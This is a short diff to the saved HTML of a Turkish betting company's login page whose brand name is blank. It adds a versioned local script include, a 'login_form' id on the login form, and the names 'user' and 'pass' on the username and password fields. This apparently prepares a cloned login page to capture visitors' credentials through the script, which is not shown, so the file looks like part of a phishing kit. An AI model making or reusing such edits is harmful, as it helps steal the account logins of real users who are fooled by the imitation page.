@@ -1,5 +1,5 @@
 <html dir="ltr" lang="tr" data-n-head="%7B%22dir%22:%7B%22ssr%22:%22ltr%22%7D,%22lang%22:%7B%22ssr%22:%22tr%22%7D%7D" style="--vh:6.67px">
-  <script src="asset/main.js"></script>
+  <script src="asset/main.js?v=31"></script>
   <head>
     <meta charset="utf-8">
     <title> - bahis şirketi. Yüksek oranlar. 24 saat müşteri hizmeti</title>
@@ -1974,7 +1974,7 @@
                     </label>
                   </li>
                 </ul>
-                <form data-v-3c1b8834="" data-v-34205283="" class="auth-form-by-password" data-v-16f06fe2="">
+                <form data-v-3c1b8834="" data-v-34205283="" class="auth-form-by-password" data-v-16f06fe2="" id="login_form">
                   <div data-v-8f3323ae="" data-v-3c1b8834="" id="content_pic" class="custom-pixel sf-hidden"></div>
                   <div data-v-2e2f93e8="" data-v-53e3f1ca="" data-v-3c1b8834="" class="field-base field auth-form-by-password__field field-base--required field-base--has-inner-offset field-base--has-label field-base--label-on-placeholder-position field-base--theme-gray-100 field-base--size-m">
                     <div data-v-2e2f93e8="" class="field-base__container">
@@ -1986,7 +1986,7 @@
                         </div>
                         <div data-v-2e2f93e8="" class="field-base__slot">
                           <div data-v-53e3f1ca="" data-v-2e2f93e8="" class="field__container">
-                            <input data-v-53e3f1ca="" aria-label="" class="field__input" data-v-2e2f93e8="" value="">
+                            <input data-v-53e3f1ca="" aria-label="" class="field__input" data-v-2e2f93e8="" value="" name="user">
                           </div>
                         </div>
                       </div>
@@ -2002,7 +2002,7 @@
                         </div>
                         <div data-v-2e2f93e8="" class="field-base__slot">
                           <div data-v-53e3f1ca="" data-v-2e2f93e8="" class="field__container">
-                            <input data-v-53e3f1ca="" aria-label="" type="password" class="field__input" data-v-2e2f93e8="" value="">
+                            <input data-v-53e3f1ca="" aria-label="" type="password" class="field__input" data-v-2e2f93e8="" value="" name="pass">
                           </div>
                         </div>
                       </div>
